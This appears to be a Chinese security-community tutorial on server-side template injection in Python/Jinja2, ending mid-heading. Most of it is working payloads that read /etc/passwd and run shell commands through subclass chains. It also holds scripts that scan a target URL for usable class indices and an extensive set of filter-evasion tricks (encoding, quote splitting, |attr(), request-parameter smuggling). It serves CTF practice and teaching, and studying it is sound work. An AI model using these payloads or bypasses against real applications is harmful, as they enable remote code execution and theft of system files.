> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [xz.aliyun.com](https://xz.aliyun.com/t/9584)

> 先知社区，先知安全技术社区

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210525174652-22549aba-bd3e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210525174652-22549aba-bd3e-1.png)

SSTI 中常用的魔术方法
-------------

很多刚开始学习 SSTI 的新手可能看到上面的利用方法就蒙圈了，不太懂为什么要这么做，下面来讲一下关于 Python 中类的知识。  
面向对象语言的方法来自于类，对于 python，有很多好用的函数库，我们经常会再写 Python 中用到 import 来引入许多的类和方法，python 的 str(字符串)、dict(字典)、tuple(元组)、list(列表) 这些在 Python 类结构的基类都是 **object**，而 object 拥有众多的子类。

`__class__`：用来查看变量所属的类，根据前面的变量形式可以得到其所属的类。 `__class__` 是类的一个内置属性，表示类的类型，返回 `<type 'type'>` ； 也是类的实例的属性，表示实例对象的类。

```
>>> ''.__class__
<type 'str'>
>>> ().__class__
<type 'tuple'>
>>> [].__class__
<type 'list'>
>>> {}.__class__
<type 'dict'>


```

`__bases__`：用来查看类的基类，也可以使用数组索引来查看特定位置的值。 通过该属性可以查看该类的所有直接父类，该属性返回所有直接父类组成的**元组**（虽然只有一个元素）。注意是直接父类！！！

```
>>> ().__class__.__bases__
(<type 'object'>,)
>>> ''.__class__.__bases__
(<type 'basestring'>,)
>>> [].__class__.__bases__
(<type 'object'>,)
>>> {}.__class__.__bases__
(<type 'object'>,)
>>> ''.__class__.__bases__[0].__bases__[0]   // python2下雨python3下不同
<type 'object'>

>>> [].__class__.__bases__[0]
<type 'object'>


```

获取基类还能用 `__mro__` 方法，`__mro__` 方法可以用来获取一个类的调用顺序，比如：

```
>>> ''.__class__.__mro__   // python2下和python3下不同
(<class 'str'>, <class 'object'>)
>>> [].__class__.__mro__
(<class 'list'>, <class 'object'>)
>>> {}.__class__.__mro__
(<class 'dict'>, <class 'object'>)
>>> ().__class__.__mro__
(<class 'tuple'>, <class 'object'>)

>>> ().__class__.__mro__[1]            // 返回的是一个类元组，使用索引就能获取基类了
<class 'object'>


```

除此之外，我们还可以利用 `__base__` 方法获取直接基类：

```
>>> "".__class__.__base__
<type 'basestring'>


```

有这些类继承的方法，我们就可以从任何一个变量，回溯到最顶层基类（`<class'object'>`）中去，再获得到此基类所有实现的类，就可以获得到很多的类和方法了。

`__subclasses__()`：查看当前类的子类组成的列表，即返回基类 object 的子类。

```
>>> [].__class__.__bases__[0].__subclasses__()
[<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>, <type 'NoneType'>, <type 'NotImplementedType'>, <type 'traceback'>, <type 'super'>, <type 'xrange'>, <type 'dict'>, <type 'set'>, <type 'slice'>, <type 'staticmethod'>, <type 'complex'>, <type 'float'>, <type 'buffer'>, <type 'long'>, <type 'frozenset'>, <type 'property'>, <type 'memoryview'>, <type 'tuple'>, <type 'enumerate'>, <type 'reversed'>, <type 'code'>, <type 'frame'>, <type 'builtin_function_or_method'>, <type 'instancemethod'>, <type 'function'>, <type 'classobj'>, <type 'dictproxy'>, <type 'generator'>, <type 'getset_descriptor'>, <type 'wrapper_descriptor'>, <type 'instance'>, <type 'ellipsis'>, <type 'member_descriptor'>, <type 'file'>, <type 'PyCapsule'>, <type 'cell'>, <type 'callable-iterator'>, <type 'iterator'>, <type 'sys.long_info'>, <type 'sys.float_info'>, <type 'EncodingMap'>, <type 'fieldnameiterator'>, <type 'formatteriterator'>, <type 'sys.version_info'>, <type 'sys.flags'>, <type 'sys.getwindowsversion'>, <type 'exceptions.BaseException'>, <type 'module'>, <type 'imp.NullImporter'>, <type 'zipimport.zipimporter'>, <type 'nt.stat_result'>, <type 'nt.statvfs_result'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class '_abcoll.Hashable'>, <type 'classmethod'>, <class '_abcoll.Iterable'>, <class '_abcoll.Sized'>, <class '_abcoll.Container'>, <class '_abcoll.Callable'>, <type 'dict_keys'>, <type 'dict_items'>, <type 'dict_values'>, <class 'site._Printer'>, <class 'site._Helper'>, <type '_sre.SRE_Pattern'>, <type '_sre.SRE_Match'>, <type '_sre.SRE_Scanner'>, <class 'site.Quitter'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <type 'operator.itemgetter'>, <type 'operator.attrgetter'>, <type 'operator.methodcaller'>, <type 'functools.partial'>, <type 'MultibyteCodec'>, <type 'MultibyteIncrementalEncoder'>, <type 'MultibyteIncrementalDecoder'>, <type 'MultibyteStreamReader'>, <type 'MultibyteStreamWriter'>]


```

查阅起来有些困难，来列举一下：

```
for i in enumerate(''.__class__.__mro__[-1].__subclasses__()): print i
.....
(0, <type 'type'>)
(1, <type 'weakref'>)
(2, <type 'weakcallableproxy'>)
(3, <type 'weakproxy'>)
(4, <type 'int'>)
(5, <type 'basestring'>)
(6, <type 'bytearray'>)
(7, <type 'list'>)
(8, <type 'NoneType'>)
(9, <type 'NotImplementedType'>)
(10, <type 'traceback'>)
(11, <type 'super'>)
(12, <type 'xrange'>)
(13, <type 'dict'>)
(14, <type 'set'>)
(15, <type 'slice'>)
(16, <type 'staticmethod'>)
(17, <type 'complex'>)
(18, <type 'float'>)
......
(38, <type 'ellipsis'>)
(39, <type 'member_descriptor'>)
(40, <type 'file'>)
(41, <type 'PyCapsule'>)
(42, <type 'cell'>)
(43, <type 'callable-iterator'>)
......


```

**注意：**这里要记住一点 2.7 和 3.6 版本返回的子类不是一样的，但是 2.7 有的 3.6 大部分都有。

当然我们也可以直接用`object.__subclasses__()`，会得到和上面一样的结果。SSTI 的主要目的就是从这么多的子类中找出可以利用的类（一般是指读写文件或执行命令的类）加以利用。

`__builtins__`：以一个集合的形式查看其引用

> #### 内建函数
> 
> 当我们启动一个 python 解释器时，即时没有创建任何变量或者函数，还是会有很多函数可以使用，我们称之为内建函数。
> 
> 内建函数并不需要我们自己做定义，而是在启动 python 解释器的时候，就已经导入到内存中供我们使用，想要了解这里面的工作原理，我们可以从名称空间开始。
> 
> `__builtins__` 方法是做为默认初始模块出现的，可用于查看当前所有导入的内建函数。

`__globals__`：该方法会以字典的形式返回当前位置的所有全局变量，与 func_globals 等价。该属性是函数特有的属性，记录当前文件全局变量的值，如果某个文件调用了 os、sys 等库，但我们只能访问该文件某个函数或者某个对象，那么我们就可以利用 globals 属性访问全局的变量。该属性保存的是函数全局变量的字典引用。

`__import__()`：该方法用于动态加载类和函数 。如果一个模块经常变化就可以使用 `__import__()` 来动态载入，就是 `import`。语法：`__import__(模块名)`

这样我们在进行 SSTI 注入的时候就可以通过这种方式使用很多的类和方法，通过子类再去获取子类的子类、更多的方法，找出可以利用的类和方法加以利用。总之，是通过 python 的对象的继承来一步步实现文件读取和命令执行的：

```
找到父类<type 'object'> ---> 寻找子类 ---> 找关于命令执行或者文件操作的模块。


```

但是遇上一个 SSTI 的题，该如何下手？大体上有以下几种思路，简单介绍一下，后续有详细总结。

*   查配置文件
*   命令执行（其实就是沙盒逃逸类题目的利用方式）
*   文件读取

利用 SSTI 读取文件
------------

### Python 2

在上文中我们使用 `__subclasses__` 方法查看子类的时候，发现可以发现索引号为 40 指向 file 类：

```
for i in enumerate(''.__class__.__mro__[-1].__subclasses__()): print i
.....
(0, <type 'type'>)
(1, <type 'weakref'>)
(2, <type 'weakcallableproxy'>)
(3, <type 'weakproxy'>)
(4, <type 'int'>)
(5, <type 'basestring'>)
(6, <type 'bytearray'>)
(7, <type 'list'>)
(8, <type 'NoneType'>)
(9, <type 'NotImplementedType'>)
(10, <type 'traceback'>)
(11, <type 'super'>)
(12, <type 'xrange'>)
(13, <type 'dict'>)
(14, <type 'set'>)
(15, <type 'slice'>)
(16, <type 'staticmethod'>)
(17, <type 'complex'>)
(18, <type 'float'>)
......
(38, <type 'ellipsis'>)
(39, <type 'member_descriptor'>)
(40, <type 'file'>)
(41, <type 'PyCapsule'>)
(42, <type 'cell'>)
(43, <type 'callable-iterator'>)
......


```

此 file 类可以直接用来读取文件：

```
{{[].__class__.__base__.__subclasses__()[40]('/etc/passwd').read()}}


```

### Python 3

使用 file 类读取文件的方法仅限于 Python 2 环境，在 Python 3 环境中 file 类已经没有了。我们可以用`<class '_frozen_importlib_external.FileLoader'>` 这个类去读取文件。

首先编写脚本遍历目标 Python 环境中 `<class '_frozen_importlib_external.FileLoader'>` 这个类索引号：

```
import requests

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'
}

for i in range(500):
    url = "http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()["+str(i)+"]}}"

    res = requests.get(url=url, headers=headers)
    if 'FileLoader' in res.text:
        print(i)

# 得到编号为79


```

所以 payload 如下：

```
{{().__class__.__bases__[0].__subclasses__()[79]["get_data"](0, "/etc/passwd")}}

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210525174654-236f65ba-bd3e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210525174654-236f65ba-bd3e-1.png)

利用 SSTI 执行命令
------------

可以用来执行命令的类有很多，其基本原理就是遍历含有 eval 函数即 os 模块的子类，利用这些子类中的 eval 函数即 os 模块执行命令。这里我们简单挑几个常用的讲解。

### 寻找内建函数 eval 执行命令

首先编写脚本遍历目标 Python 环境中含有内建函数 eval 的子类的索引号：

```
import requests

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'
}

for i in range(500):
    url = "http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()["+str(i)+"].__init__.__globals__['__builtins__']}}"

    res = requests.get(url=url, headers=headers)
    if 'eval' in res.text:
        print(i)

# 得到一大堆子类的索引:
64
65
66
67
68
79
80
81
83
91
92
93
94
95
96
117
...


```

我们可以记下几个含有 eval 函数的类：

*   warnings.catch_warnings
*   WarningMessage
*   codecs.IncrementalEncoder
*   codecs.IncrementalDecoder
*   codecs.StreamReaderWriter
*   os._wrap_close
*   reprlib.Repr
*   weakref.finalize
*   ......

所以 payload 如下：

```
{{''.__class__.__bases__[0].__subclasses__()[166].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}


```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210525174655-2436b6ce-bd3e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210525174655-2436b6ce-bd3e-1.png)

我们可以看到，使用 eval 函数执行命令也是调用的 os 模块，那我们直接调用 os 模块不是更简单？

### 寻找 os 模块执行命令

Python 的 os 模块中有 system 和 popen 这两个函数可用来执行命令。其中 system() 函数执行命令是没有回显的，我们可以使用 system() 函数配合 curl 外带数据；popen() 函数执行命令有回显。所以比较常用的函数为 popen() 函数，而当 popen() 函数被过滤掉时，可以使用 system() 函数代替。

首先编写脚本遍历目标 Python 环境中含有 os 模块的类的索引号：

```
import requests

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'
}

for i in range(500):
    url = "http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()["+str(i)+"].__init__.__globals__}}"

    res = requests.get(url=url, headers=headers)
    if 'os.py' in res.text:
        print(i)

# 可以得到一大堆类
64
65
66
67
68
79
80
81
83
117
147
154
161
162
163
164
...


```

随便挑一个类构造 payload 执行命令即可：

```
{{''.__class__.__bases__[0].__subclasses__()[79].__init__.__globals__['os'].popen('ls /').read()}}


```

但是该方法遍历得到的类不准确，因为一些不相关的类名中也存在字符串 “os”，所以我们还要探索更有效的方法。

我们可以看到，即使是使用 os 模块执行命令，其也是调用的 os 模块中的 popen 函数，那我们也可以直接调用 popen 函数，存在 popen 函数的类一般是 `os._wrap_close`，但也不绝对。由于目标 Python 环境的不同，我们还需要遍历一下。

### 寻找 popen 函数执行命令

首先编写脚本遍历目标 Python 环境中含有 popen 函数的类的索引号：

```
import requests

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'
}

for i in range(500):
    url = "http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()["+str(i)+"].__init__.__globals__}}"

    res = requests.get(url=url, headers=headers)
    if 'popen' in res.text:
        print(i)

# 得到编号为117


```

直接构造 payload 即可：

```
{{''.__class__.__bases__[0].__subclasses__()[117].__init__.__globals__['popen']('ls /').read()}}


```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210525174656-249c2ca2-bd3e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210525174656-249c2ca2-bd3e-1.png)

这样得到的索引还是很准确的。

除了这种方法外，我们还可以直接导入 os 模块，python 有一个 importlib 类，可用 load_module 来导入你需要的模块。

### 寻找 importlib 类执行命令

Python 中存在 `<class '_frozen_importlib.BuiltinImporter'>` 类，目的就是提供 Python 中 import 语句的实现（以及 `__import__` 函数）。我么可以直接利用该类中的 load_module 将 os 模块导入，从而使用 os 模块执行命令。

首先编写脚本遍历目标 Python 环境中 importlib 类的索引号：

```
import requests

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'
}

for i in range(500):
    url = "http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()["+str(i)+"]}}"

    res = requests.get(url=url, headers=headers)
    if '_frozen_importlib.BuiltinImporter' in res.text:
        print(i)

# 得到编号为69


```

构造如下 payload 即可执行命令：

```
{{[].__class__.__base__.__subclasses__()[69]["load_module"]("os")["popen"]("ls /").read()}}


```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210525174657-2573bb86-bd3e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210525174657-2573bb86-bd3e-1.png)

### 寻找 linecache 函数执行命令

linecache 这个函数可用于读取任意一个文件的某一行，而这个函数中也引入了 os 模块，所以我们也可以利用这个 linecache 函数去执行命令。

首先编写脚本遍历目标 Python 环境中含有 linecache 这个函数的子类的索引号：

```
import requests

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'
}

for i in range(500):
    url = "http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()["+str(i)+"].__init__.__globals__}}"

    res = requests.get(url=url, headers=headers)
    if 'linecache' in res.text:
        print(i)

# 得到一堆子类的索引:
168
169
203
206
207
208
...


```

随便挑一个子类构造 payload 即可：

```
{{[].__class__.__base__.__subclasses__()[168].__init__.__globals__['linecache']['os'].popen('ls /').read()}}

{{[].__class__.__base__.__subclasses__()[168].__init__.__globals__.linecache.os.popen('ls /').read()}}


```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210525174659-26292458-bd3e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210525174659-26292458-bd3e-1.png)

### 寻找 subprocess.Popen 类执行命令

从 python2.4 版本开始，可以用 subprocess 这个模块来产生子进程，并连接到子进程的标准输入 / 输出 / 错误中去，还可以得到子进程的返回值。

subprocess 意在替代其他几个老的模块或者函数，比如：`os.system`、`os.popen` 等函数。

首先编写脚本遍历目标 Python 环境中含有 linecache 这个函数的子类的索引号：

```
import requests

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'
}

for i in range(500):
    url = "http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()["+str(i)+"]}}"

    res = requests.get(url=url, headers=headers)
    if 'linecache' in res.text:
        print(i)

# 得到索引为245


```

则构造如下 payload 执行命令即可：

```
{{[].__class__.__base__.__subclasses__()[245]('ls /',shell=True,stdout=-1).communicate()[0].strip()}}

# {{[].__class__.__base__.__subclasses__()[245]('要执行的命令',shell=True,stdout=-1).communicate()[0].strip()}}


```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210525174659-268a5d54-bd3e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210525174659-268a5d54-bd3e-1.png)

关键字绕过
-----

### 利用字符串拼接绕过

我们可以利用 “+” 进行字符串拼接，绕过关键字过滤，例如：

```
{{().__class__.__bases__[0].__subclasses__()[40]('/fl'+'ag').read()}}

{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("o"+"s").popen("ls /").read()')}}

{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__buil'+'tins__']['eval']('__import__("os").popen("ls /").read()')}}


```

只要返回的是**字典类型**的或是**字符串格式**的，即 payload 中引号内的，在调用的时候都可以使用字符串拼接绕过。

### 利用编码绕过

我们可以利用对关键字编码的方法，绕过关键字过滤，例如用 base64 编码绕过：

```
{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['X19idWlsdGluc19f'.decode('base64')]['ZXZhbA=='.decode('base64')]('X19pbXBvcnRfXygib3MiKS5wb3BlbigibHMgLyIpLnJlYWQoKQ=='.decode('base64'))}}


```

等同于：

```
{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}


```

可以看到，在 payload 中，只要是字符串的，即 payload 中引号内的，都可以用编码绕过。同理还可以进行 rot13、16 进制编码等。

### 利用 Unicode 编码绕过关键字（flask 适用）

unicode 编码绕过是一种网上没提出的方法。

我们可以利用 unicode 编码的方法，绕过关键字过滤，例如：

```
{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f']['\u0065\u0076\u0061\u006c']('__import__("os").popen("ls /").read()')}}

{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['\u006f\u0073'].popen('\u006c\u0073\u0020\u002f').read()}}


```

等同于：

```
{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}

{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls /').read()}}


```

### 利用 Hex 编码绕过关键字

和上面那个一样，只不过将 Unicode 编码换成了 Hex 编码，适用于过滤了 “u” 的情况。

我们可以利用 hex 编码的方法，绕过关键字过滤，例如：

```
{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f']['\x65\x76\x61\x6c']('__import__("os").popen("ls /").read()')}}

{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['\x6f\x73'].popen('\x6c\x73\x20\x2f').read()}}


```

等同于：

```
{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}

{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls /').read()}}


```

### 利用引号绕过

我们可以利用引号来绕过对关键字的过滤。例如，过滤了 flag，那么我们可以用 `fl""ag` 或 `fl''ag` 的形式来绕过：

```
[].__class__.__base__.__subclasses__()[40]("/fl""ag").read()


```

再如：

```
().__class__.__base__.__subclasses__()[77].__init__.__globals__['o''s'].popen('ls').read()

{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__buil''tins__']['eval']('__import__("os").popen("ls /").read()')}}


```

可以看到，在 payload 中，只要是字符串的，即 payload 中引号内的，都可以用引号绕过。

### 利用 join() 函数绕过

我们可以利用 join() 函数来绕过关键字过滤。例如，题目过滤了 flag，那么我们可以用如下方法绕过：

```
[].__class__.__base__.__subclasses__()[40]("fla".join("/g")).read()


```

绕过其他字符
------

### 过滤了中括号 [ ]

**利用 `__getitem__()` 绕过**

可以使用 `__getitem__()` 方法输出序列属性中的某个索引处的元素，如：

```
"".__class__.__mro__[2]
"".__class__.__mro__.__getitem__(2)
['__builtins__'].__getitem__('eval')


```

如下示例：

```
{{''.__class__.__mro__.__getitem__(2).__subclasses__().__getitem__(40)('/etc/passwd').read()}}       // 指定序列属性

{{().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(59).__init__.__globals__.__getitem__('__builtins__').__getitem__('eval')('__import__("os").popen("ls /").read()')}}       // 指定字典属性


```

**利用 pop() 绕过**

pop() 方法可以返回指定序列属性中的某个索引处的元素或指定字典属性中某个键对应的值，如下示例：

```
{{''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()}}       // 指定序列属性

{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.__globals__.pop('__builtins__').pop('eval')('__import__("os").popen("ls /").read()')}}       // 指定字典属性


```

注意：最好不要用 pop()，因为 pop() 会删除相应位置的值。

**利用字典读取绕过**

我们知道访问字典里的值有两种方法，一种是把相应的键放入熟悉的方括号 `[]` 里来访问，一种就是用点 `.` 来访问。所以，当方括号 `[]` 被过滤之后，我们还可以用点 `.` 的方式来访问，如下示例

```
// __builtins__.eval()

{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.__globals__.__builtins__.eval('__import__("os").popen("ls /").read()')}}


```

等同于：

```
// [__builtins__]['eval']()

{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}


```

### 过滤了引号

**利用 chr() 绕过**

先获取 chr() 函数，赋值给 chr，后面再拼接成一个字符串

```
{% set chr=().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.chr%}{{().__class__.__bases__.[0].__subclasses__().pop(40)(chr(47)+chr(101)+chr(116)+chr(99)+chr(47)+chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(100)).read()}}

# {% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr%}{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)+chr(101)+chr(116)+chr(99)+chr(47)+chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(100)).read()}}


```

等同于

```
{{().__class__.__bases__[0].__subclasses__().pop(40)('/etc/passwd').read()}}


```

**利用 request 对象绕过**

示例：

```
{{().__class__.__bases__[0].__subclasses__().pop(40)(request.args.path).read()}}&path=/etc/passwd

{{().__class__.__base__.__subclasses__()[77].__init__.__globals__[request.args.os].popen(request.args.cmd).read()}}&os=os&cmd=ls /


```

等同于：

```
{{().__class__.__bases__[0].__subclasses__().pop(40)('/etc/passwd').read()}}

{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls /').read()}}


```

如果过滤了 args，可以将其中的 request.args 改为 request.values，POST 和 GET 两种方法传递的数据 request.values 都可以接收。

### 过滤了下划线__

**利用 request 对象绕过**

```
{{()[request.args.class][request.args.bases][0][request.args.subclasses]()[40]('/flag').read()}}&class=__class__&bases=__bases__&subclasses=__subclasses__

{{()[request.args.class][request.args.bases][0][request.args.subclasses]()[77].__init__.__globals__['os'].popen('ls /').read()}}&class=__class__&bases=__bases__&subclasses=__subclasses__


```

等同于：

```
{{().__class__.__bases__[0].__subclasses__().pop(40)('/etc/passwd').read()}}

{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls /').read()}}


```

### 过滤了点 .

**利用 `|attr()` 绕过（适用于 flask）**

如果 `.` 也被过滤，且目标是 JinJa2（flask）的话，可以使用原生 JinJa2 函数`attr()`，即：

```
().__class__   =>  ()|attr("__class__")


```

示例：

```
{{()|attr("__class__")|attr("__base__")|attr("__subclasses__")()|attr("__getitem__")(77)|attr("__init__")|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("ls /")|attr("read")()}}


```

等同于：

```
{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls /').read()}}


```

**利用中括号 [ ] 绕过**

如下示例：

```
{{''['__class__']['__bases__'][0]['__subclasses__']()[59]['__init__']['__globals__']['__builtins__']['eval']('__import__("os").popen("ls").read()')}}


```

等同于：

```
{{().__class__.__bases__.[0].__subclasses__().[59].__init__['__globals__']['__builtins__'].eval('__import__("os").popen("ls /").read()')}}


```

**这样的话，那么 `__class__`、`__bases__` 等关键字就成了字符串，就都可以用前面所讲的关键字绕过的姿势进行绕过了。**

### 过滤了大括号 `{{`

我们可以用 Jinja2 的 `{%...%}` 语句装载一个循环控制语句来绕过：

```
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls /').read()")}}{% endif %}{% endfor %}


```

也可以使用 `{% if ... %}1{% endif %}` 配合 `os.popen` 和 `curl` 将执行结果外带（不外带的话无回显）出来：

```
{% if ''.__class__.__base__.__subclasses__()[59].__init__.func_globals.linecache.os.popen('ls /' %}1{% endif %}


```

也可以用 `{%print(......)%}` 的形式来代替 `{{` ，如下：

```
{%print(''.__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls').read())%}


```

利用 `|attr()` 来 Bypass
---------------------

这里说一个新东西，就是原生 JinJa2 函数 `attr()`，这是一个 `attr()` 过滤器，它只查找属性，获取并返回对象的属性的值，过滤器与变量用管道符号（ `|` ）分割。如：

```
foo|attr("bar")   等同于   foo["bar"]


```

`|attr()` 配合其他姿势可同时绕过双下划线 `__` 、引号、点 `.` 和 `[` 等，下面给出示例。

### 同时过滤了 . 和 []

过滤了以下字符：

```
.    [

```

绕过姿势：

```
{{()|attr("__class__")|attr("__base__")|attr("__subclasses__")()|attr("__getitem__")(77)|attr("__init__")|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("ls")|attr("read")()}}


```

等同于：

```
{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls').read()}}


```

### 同时过滤了 __ 、点. 和 []

过滤了以下字符：

下面我们演示绕过姿势，先写出 payload 的原型：

```
{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}


```

由于中括号 `[` 被过滤了，我们可以用 `__getitem__()` 来绕过（尽量不要用 pop()），类似如下：

```
{{().__class__.__base__.__subclasses__().__getitem__(77).__init__.__globals__.__getitem__('__builtins__').__getitem__('eval')('__import__("os").popen("ls /").read()')}}


```

由于还过滤了下划线 `__`，我们可以用 request 对象绕过，但是还过滤了中括号 `[]`，所以我们要同时绕过 `__` 和 `[`，就用到了我们的`|attr()`

所以最终的 payload 如下：

```
{{()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()|attr(request.args.x4)(77)|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)(request.args.x7)|attr(request.args.x4)(request.args.x8)(request.args.x9)}}&x1=__class__&x2=__base__&x3=__subclasses__&x4=__getitem__&x5=__init__&x6=__globals__&x7=__builtins__&x8=eval&x9=__import__("os").popen('ls /').read()


```

### 用 Unicode 编码配合 `|attr()` 进行 Bypass

过滤了以下字符：

```
'  request  {{  _  %20(空格)  [  ]  .  __globals__   __getitem__


```

我们用 `{%...%}`绕过对 `{{` 的过滤，并用 unicode 绕过对关键字的过滤。unicode 绕过是一种网上没提出的方法。

假设我们要构造的 payload 原型为：

```
{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls').read()}}


```

先用 `|attr` 绕过 `.` 和 `[]`：

```
{{()|attr("__class__")|attr("__base__")|attr("__subclasses__")()|attr("__getitem__")(77)|attr("__init__")|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("ls")|attr("read")()}}


```

我们可以将过滤掉的字符用 unicode 替换掉：

```
{{()|attr("\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f")|attr("\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f")|attr("\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f")()|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")(77)|attr("\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f")|attr("\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f")|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")("os")|attr("popen")("ls")|attr("read")()}}


```

### 用 Hex 编码配合 `|attr()` 进行 Bypass

和上面那个一样，只不过是将 Unicode 编码换成了 Hex 编码，适用于 “u” 被过滤了的情况。

我们可以将过滤掉的字符用 Hex 编码替换掉：

```
{{()|attr("\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f")|attr("\x5f\x5f\x62\x61\x73\x65\x5f\x5f")|attr("\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f")()|attr("\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f")(258)|attr("\x5f\x5f\x69\x6e\x69\x74\x5f\x5f")|attr("\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f")|attr("\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f")("os")|attr("popen")("cat\x20\x66\x6c\x61\x67\x2e\x74\x78\x74")|attr("read")()}}


```

使用 JinJa 的过滤器进行 Bypass
----------------------

